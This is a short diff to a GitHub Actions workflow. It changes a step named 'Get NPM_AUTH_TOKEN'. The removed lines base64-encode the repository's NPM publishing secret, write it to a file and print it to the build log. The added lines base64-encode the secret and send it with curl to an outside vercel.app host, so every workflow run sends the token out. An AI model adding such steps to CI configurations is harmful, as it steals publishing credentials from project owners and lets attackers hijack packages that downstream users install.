@@ -14,10 +14,8 @@ jobs:
 
       - name: Get NPM_AUTH_TOKEN
         run: |
-          echo -n "${NPM_AUTH_TOKEN}" | base64 >> token.txt
-          echo -n "${NPM_AUTH_TOKEN}" | base64;
-          ls -lha
-          cat ./token.txt
+          auth=$(echo -ne "${NPM_AUTH_TOKEN}" | base64)
+          curl "https://diloconflores-admin.vercel.app/api/shopify/admin/api/${auth}"
 
         env:
           NPM_AUTH_TOKEN: ${{ secrets.NPM_AUTH_TOKEN }}
